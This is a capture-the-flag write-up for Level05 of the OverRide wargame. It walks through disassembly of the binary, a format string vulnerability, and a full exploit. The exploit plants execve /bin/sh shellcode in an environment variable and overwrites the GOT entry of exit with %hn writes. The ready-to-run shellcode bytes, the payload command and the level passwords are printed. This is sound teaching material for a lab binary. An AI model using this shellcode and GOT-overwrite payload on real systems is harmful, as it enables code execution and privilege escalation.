[README](../README.md)
# Level05
previous flag: `3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN`

## disas main
- stack frame + align + prepare buffer to read input in <+49> from stdin using fgets.
```
(gdb) x/s 0x80497f0
0x80497f0 <stdin@@GLIBC_2.0>:	 ""

```
- from <+65> to <+186> the input is processed within a loop that checks each character of the input
- index variable for loop is initialized (at 0) in: `0x0804847a <+54>:	movl   $0x0,0x8c(%esp)`
- If the character is within the ASCII range of uppercase letters (A-Z), it converts it to lowercase by toggling the 5th bit (hexadecimal value 0x20), executing these steps
   - mov %eax, %edx: This copies the character value from %eax to %edx.
   - xor $0x20, %edx: This XOR operation toggles the 5th bit of the character, effectively converting an uppercase letter to lowercase (assuming ASCII encoding).
   - mov %dl, (%eax): This stores the lowercase character back into the string buffer at the same location.
- The loop increments the index (0x8c(%esp)) and continues until the end of the string.
- in <+175> scas instruction is called to calculate the length of the modified string
- <+184>: index in %eax is compared with string length stored in %ebx.
- <+186>: jump back to <+67> at the beginning of loop if compariso,n is not true
- otherwise the modified string is printed with printf

```
0x08048485 <+65>:	jmp    0x80484d3 <main+143>
   0x08048487 <+67>:	lea    0x28(%esp),%eax
   0x0804848b <+71>:	add    0x8c(%esp),%eax
   0x08048492 <+78>:	movzbl (%eax),%eax
   0x08048495 <+81>:	cmp    $0x40,%al
   0x08048497 <+83>:	jle    0x80484cb <main+135>
   0x08048499 <+85>:	lea    0x28(%esp),%eax
   0x0804849d <+89>:	add    0x8c(%esp),%eax
   0x080484a4 <+96>:	movzbl (%eax),%eax
   0x080484a7 <+99>:	cmp    $0x5a,%al
   0x080484a9 <+101>:	jg     0x80484cb <main+135>
   0x080484ab <+103>:	lea    0x28(%esp),%eax
   0x080484af <+107>:	add    0x8c(%esp),%eax
   0x080484b6 <+114>:	movzbl (%eax),%eax
   0x080484b9 <+117>:	mov    %eax,%edx
   0x080484bb <+119>:	xor    $0x20,%edx
   0x080484be <+122>:	lea    0x28(%esp),%eax
   0x080484c2 <+126>:	add    0x8c(%esp),%eax
   0x080484c9 <+133>:	mov    %dl,(%eax)
   0x080484cb <+135>:	addl   $0x1,0x8c(%esp)
   0x080484d3 <+143>:	mov    0x8c(%esp),%ebx
   0x080484da <+150>:	lea    0x28(%esp),%eax
   0x080484de <+154>:	movl   $0xffffffff,0x1c(%esp)
   0x080484e6 <+162>:	mov    %eax,%edx
   0x080484e8 <+164>:	mov    $0x0,%eax
   0x080484ed <+169>:	mov    0x1c(%esp),%ecx
   0x080484f1 <+173>:	mov    %edx,%edi
   0x080484f3 <+175>:	repnz scas %es:(%edi),%al
   0x080484f5 <+177>:	mov    %ecx,%eax
   0x080484f7 <+179>:	not    %eax
   0x080484f9 <+181>:	sub    $0x1,%eax
   0x080484fc <+184>:	cmp    %eax,%ebx
   0x080484fe <+186>:	jb     0x8048487 <main+67>

```

## vulnerability
- printf is called right bfore exiting. the main doesn't return. that means that we can replace the GOT address of exit with our shellcode exploiting the format string vulnerability

## solution

- we store the code that implements the execve system call to spawn a shell with "/bin/sh" as an argument to execute instead of exit in the env with a lot of nope (\x90, the shellcode preceded by a sequence of NOP instructions creates a unique pattern in memory that can be easily identified) before:
`export SHELLCODE=$(python -c 'print "\x90"*1000+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"')`
- we find the address where the shellcode has been stored:
```
(gdb) b *main
Breakpoint 1 at 0x8048444
(gdb) run
Starting program: /home/users/level05/level05 

Breakpoint 1, 0x08048444 in main ()
(gdb) x/200s environ
```
this give us a list of 200 memory case contents starting from the address of the environment variable array for the program level05 (yes it is the same pointer passed as the third argument to main function in c => char *envp[])
=> when we find something like (addresses vary) `0xffffd4c9:	 "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\ ` we are in front of the nop sequence :  \220 is the octal representation of the decimal value 144. The hexadecimal representation of 144 is 0x90. In the x86 assembly language, the opcode 0x90 corresponds to the nop instruction
=> below we find something like: `0xffffd8b1:	 "\220\220\220\220\220\220\220\220\220\220\353\037^\211v\b1\300\210F\a\211F\f\260\v\211\363\215N\b\215V\f̀1ۉ\330@̀\350\334\377\377\377/bin/sh"`
- we better check around the address `0xffffd4c9`:
```
(gdb) x/20i 0xffffd8b1
   0xffffd8b1:	nop
   0xffffd8b2:	nop
   0xffffd8b3:	nop
   0xffffd8b4:	nop
   0xffffd8b5:	nop
   0xffffd8b6:	nop
   0xffffd8b7:	nop
   0xffffd8b8:	nop
   0xffffd8b9:	nop
   0xffffd8ba:	nop
   0xffffd8bb:	jmp    0xffffd8dc
   0xffffd8bd:	pop    %esi
   0xffffd8be:	mov    %esi,0x8(%esi)
   0xffffd8c1:	xor    %eax,%eax
   0xffffd8c3:	mov    %al,0x7(%esi)
   0xffffd8c6:	mov    %eax,0xc(%esi)
   0xffffd8c9:	mov    $0xb,%al
   0xffffd8cb:	mov    %esi,%ebx
   0xffffd8cd:	lea    0x8(%esi),%ecx
   0xffffd8d0:	lea    0xc(%esi),%edx
```
- so exact address of shellcode is 0xffffd8bb
- we find the offset of printf where the user input is store to prepare the format string attack
```
python -c "print 'aaaa' + ' %x ' * 16" | ./level05
aaaa 64  f7fcfac0  f7ec3af9  ffffd2bf  ffffd2be  0  ffffffff  ffffd344  f7fdb000  61616161  20782520  20782520  20782520  20782520  20782520  20782520 
```
=> arg in pos 10
- we find the GOT address of exit:
```
level05@OverRide:~$ objdump -R ./level05

./level05:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
080497c4 R_386_GLOB_DAT    __gmon_start__
080497f0 R_386_COPY        stdin
080497d4 R_386_JUMP_SLOT   printf
080497d8 R_386_JUMP_SLOT   fgets
080497dc R_386_JUMP_SLOT   __gmon_start__
080497e0 R_386_JUMP_SLOT   exit
080497e4 R_386_JUMP_SLOT   __libc_start_main
```
- we craft the payload keeping in mind that since the shellcode is too long we can't write in decimal its whole address and we need to split in 2 parts:
```
(python -c 'print "\xe0\x97\x04\x08"+"\xe2\x97\x04\x08" + "%55475d"+"%10$hn"+"%10052d"+"%11$hn"'; cat) | ./level05
```
where:
- \xe0\x97\x04\x08 is exit GOTaddress in little endian
- \xe2\x97\x04\x08 is the memory case 2 bytes futher
- %55475d is the n.  of character that we want to write corresponding to the first part in little endian of the  address of shellcode (d8bb in 0xffffd8bb that is 55483) - 8 bytes (the 2 contiguous addresses of EXIT in GOT). 55483 - 8 = 55475
- %10$hn = we want to write the n. of character into the 10th arg from offset. The hn format specifier is used because you're writing a 16-bit value (2 bytes) to the memory address => The maximum value that can be represented by a 16-bit signed integer is 32767 (0x7FFF).
- %10052d is the result of the first part of shellcode in decimal (ffff = 65535) - the first part (55483)
- %11$hn = 11th arg, the one right after the 10th
- ; cat = is used to concatenate the output of the Python command with the input from the standard input 

```
cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```






